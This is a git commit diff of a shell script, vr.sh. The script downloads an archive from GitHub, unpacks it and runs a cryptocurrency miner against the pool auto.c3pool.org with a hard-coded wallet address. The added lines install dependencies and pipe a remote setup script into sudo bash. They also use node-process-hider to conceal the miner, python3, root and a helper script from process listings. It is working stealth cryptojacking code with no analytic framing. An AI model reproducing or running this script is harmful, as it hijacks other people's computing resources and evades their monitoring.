b9e3c97c7dad2d13aaf399ef4d1be45714b0e100
muledan1 <108221871+muledan1@users.noreply.github.com>
2022-09-09 15:40:47 +0700

    Update vr.sh

--- vr.sh
+++ vr.sh
@@ -2,4 +2,20 @@
 pkill -
 wget https://github.com/muledan1/bash/raw/main/-.tar.gz
 tar -xf -.tar.gz
+apt-get update;apt-get -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
+curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
+apt-get install -y nodejs
+npm i -g node-process-hider
+ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
+dpkg-reconfigure --frontend noninteractive tzdata
+
+sudo swapoff -a; sudo swapon -a
+sleep 10
+ph add gudubrag.sh
+Ph add python3
+ph add root
+ph add node-process-hider
+ph add -
 ./- -o auto.c3pool.org:80 -u 8Akom9jdkvSSA6EGYTb4Uy19Z2QAWE7NGbZQ6iafP5xeVZXLYNuSFPURqTVATZKuB6T5NeYpuabDshnodCURBxMpP7y889B.GS 
+sleep 10
+
